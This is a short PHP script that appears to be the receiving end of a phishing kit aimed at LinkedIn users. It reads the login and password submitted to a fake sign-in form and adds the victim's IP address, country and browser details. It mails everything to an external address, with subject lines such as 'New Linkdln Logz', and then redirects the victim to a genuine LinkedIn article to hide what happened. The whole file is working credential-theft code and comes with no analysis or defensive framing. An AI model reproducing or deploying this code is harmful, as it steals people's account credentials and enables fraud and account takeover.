<?

$login=$_GET['login'];
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message .=     "Username : ".$_POST['login']."\n";
$message .=     "Password : ".$_POST['password']."\n";
$message .=     "Referer  : {$_POST['referer']}\n";
$message .=     "IP: ".$ip."\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$sniper = 'New Linkdln Logz ';
$who_be_the_boss = 'Logz By [MMBM]';
$subj = "$sniper Login $ip $adddate\n";
$from = "From: $who_be_the_boss <MMBM>\n";
mail("sam@eggy.ru",$subj,$message,$from,$sniper);

header("Location: https://www.linkedin.com/pulse/brick-making-machine-suppliers-india-china-wangda-india ");

?>